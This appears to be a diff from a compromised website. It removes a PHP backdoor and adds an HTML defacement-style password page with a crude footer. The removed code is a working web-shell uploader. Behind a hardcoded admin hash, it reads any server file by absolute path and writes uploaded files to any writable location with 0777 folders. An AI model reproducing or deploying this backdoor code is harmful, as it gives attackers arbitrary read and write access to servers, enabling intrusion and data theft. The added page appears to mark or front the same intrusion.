@@ -1,157 +1,113 @@
-<?php
-// Upload
-$auth_users = array(
-    'admin' => '$2y$10$/M6EWJ9laWHQzJJpDrt1ZuvTe2Fdq0SCK3kTSQjuX/b8qxjh4VLOK',
-);
-
-function fm_clean_path($path, $trim = true)
-{
-    $path = $trim ? trim($path) : $path;
-    $path = trim($path, '\\/');
-    $path = str_replace(array('../', '..\\'), '', $path);
-    $path =  get_absolute_path($path);
-    if ($path == '..') {
-        $path = '';
-    }
-    return str_replace('\\', '/', $path);
-}
-function get_absolute_path($path)
-{
-    $path = str_replace(array('/', '\\'), DIRECTORY_SEPARATOR, $path);
-    $parts = array_filter(explode(DIRECTORY_SEPARATOR, $path), 'strlen');
-    $absolutes = array();
-    foreach ($parts as $part) {
-        if ('.' == $part) continue;
-        if ('..' == $part) {
-            array_pop($absolutes);
-        } else {
-            $absolutes[] = $part;
-        }
-    }
-    return implode(DIRECTORY_SEPARATOR, $absolutes);
-}
-function fm_isvalid_filename($text)
-{
-    return (strpbrk($text, '/?%*:|"<>') === FALSE) ? true : false;
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<title>Nangisan kakean pola</title>
+<style>
+body {
+    background: linear-gradient(135deg, #F5FFFA 50%, #000000 50%);
+    color: #FFFFFF;
+    height: 100vh;
+    margin: 0;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    font-family: Arial, sans-serif;
 }
 
-if (isset($_GET['file'])) {
-    $user = $_SERVER['PHP_AUTH_USER'];
-    $pass = $_SERVER['PHP_AUTH_PW'];
-    if (!isset($user) || !isset($pass)) {
-        $response = array('status' => 'error', 'info' => "Authentication failed");
-        echo json_encode($response);
-        exit();
-    }
-    if (!password_verify($pass, $auth_users[$user])) {
-        $response = array('status' => 'error', 'info' => "Authentication failed");
-        echo json_encode($response);
-        exit();
-    }
+.login-card {
+    border-radius: 20px;
+    padding: 25px;
+    max-width: 500px;
+    width: 100%;
+    text-align: center;
+    background: radial-gradient(circle, rgba(255,0,0,0.35) 0%, rgba(0,0,0,0.9) 70%);
+    box-shadow: 0 0 25px rgb(255,255,255);
+}
 
-    $filePath = fm_clean_path($_GET['file']);
-    $filePath = '/' . $filePath;
+/* === BORDER GAMBAR (WARNA ASLI PUTIH) === */
+.login-card img {
+    width: 100%;
+    max-width: 420px;
+    margin: 25px auto;
+    display: block;
+    border-radius: 12px;
 
-    if (file_exists($filePath) && is_readable($filePath)) {
-        $response = array('status' => 'success', 'file' => file_get_contents($filePath));
-        echo json_encode($response);
-        exit;
-    } else {
-        $response = array('status' => 'error', 'info' => "File not found");
-        echo json_encode($response);
-        exit;
+    border: 6px solid #FFFFFF;
+
+    box-shadow:
+        0 0 15px #FFFFFF,
+        0 0 30px #FFFFFF,
+        0 0 45px #FFFFFF,
+        0 0 70px #FFFFFF,
+        0 0 100px rgb(255, 255, 255);
+
+    animation: glowPulse 1.5s infinite alternate;
+}
+
+@keyframes glowPulse {
+    0% {
+        box-shadow:
+            0 0 20px #FFFFFF,
+            0 0 50px #FFFFFF;
+    }
+    100% {
+        box-shadow:
+            0 0 40px #FFFFFF,
+            0 0 120px #FFFFFF;
     }
 }
 
-if (!empty($_FILES)) {
-	
-	$user = $_SERVER['PHP_AUTH_USER'];
-	$pass = $_SERVER['PHP_AUTH_PW'];
-	if (!isset($user) || !isset($pass)) {
-		$response = array('status' => 'error', 'info' => "Authentication failed");
-		echo json_encode($response);
-		exit();
-	}
-	if (!password_verify($pass, $auth_users[$user])) {
-		$response = array('status' => 'error', 'info' => "Authentication failed");
-		echo json_encode($response);
-		exit();
-	}
-
-    $fullPathInput = fm_clean_path($_REQUEST['fullpath']);
-
-    $f = $_FILES;
-    $path = '';
-    $ds = DIRECTORY_SEPARATOR;
-
-    $errors = 0;
-    $uploads = 0;
-    $allowed = [];
-    $response = array(
-        'status' => 'error',
-        'info'   => 'Oops! Try again'
-    );
-
-    $filename = $f['file']['name'];
-    $tmp_name = $f['file']['tmp_name'];
-    $ext = pathinfo($filename, PATHINFO_FILENAME) != '' ? strtolower(pathinfo($filename, PATHINFO_EXTENSION)) : '';
-    $isFileAllowed = ($allowed) ? in_array($ext, $allowed) : true;
-
-    if (!fm_isvalid_filename($filename) && !fm_isvalid_filename($fullPathInput)) {
-        $response = array(
-            'status'    => 'error',
-            'info'      => "Invalid File name!",
-        );
-        echo json_encode($response);
-        exit();
-    }
-
-    if (!empty($_POST['rootpath'])) {
-        $path = $_POST['rootpath'];
-        $targetPath = $path;
-    } else {
-        $targetPath = $path . $ds;
-    }
-    if (is_writable($targetPath)) {
-        $fullPath = $path . '/' . $fullPathInput;
-        $folder = substr($fullPath, 0, strrpos($fullPath, "/"));
-
-        if (!is_dir($folder)) {
-            $old = umask(0);
-            mkdir($folder, 0777, true);
-            umask($old);
-        }
-
-        if (empty($f['file']['error']) && !empty($tmp_name) && $tmp_name != 'none' && $isFileAllowed) {
-            if (move_uploaded_file($tmp_name, $fullPath)) {
-                // Be sure that the file has been uploaded
-                if (file_exists($fullPath)) {
-                    $response = array(
-                        'status'    => 'success',
-                        'info' => "file upload successful"
-                    );
-                } else {
-                    $response = array(
-                        'status' => 'error',
-                        'info'   => 'Couldn\'t upload the requested file.'
-                    );
-                }
-            } else {
-                $response = array(
-                    'status'    => 'error',
-                    'info'      => "Error while uploading files. Uploaded files $uploads",
-                );
-            }
-        }
-    } else {
-        $response = array(
-            'status' => 'error',
-            'info'   => 'The specified folder for upload isn\'t writeable.'
-        );
-    }
-    // Return the response
-    echo json_encode($response);
-    exit();
+.notice {
+    color: #FFFFFF;
+    font-size: 20px;
+    text-align: justify;
+    line-height: 1.6;
+    margin: 20px 0;
 }
-    echo __FILE__;
-?>
+
+.form-group {
+    margin-bottom: 15px;
+}
+
+input[type=password] {
+    width: 100%;
+    padding: 10px;
+    text-align: center;
+    border-radius: 6px;
+    border: none;
+}
+
+button {
+    width: 100%;
+    padding: 10px;
+    background: #FFFFFC;
+    border: none;
+    font-weight: bold;
+    cursor: pointer;
+}
+
+footer {
+    margin-top: 30px;
+    color: #0FF;
+    font-size: 13px;
+}
+</style>
+</head>
+
+<body>
+<div class="login-card">
+
+<img src="https://e.top4top.io/p_36919teqs0.jpg" alt="Banner Image">
+
+    <div class="form-group">
+        <input type="password" name="password" placeholder="Tinggalkan Pesan" required>
+        </div>
+        <button type="submit">Lap sek umbele</button><br>
+</form>
+
+<footer>
+<h1>P U K I - P O P O<h1>
+</footer>
+</div>
+</html>
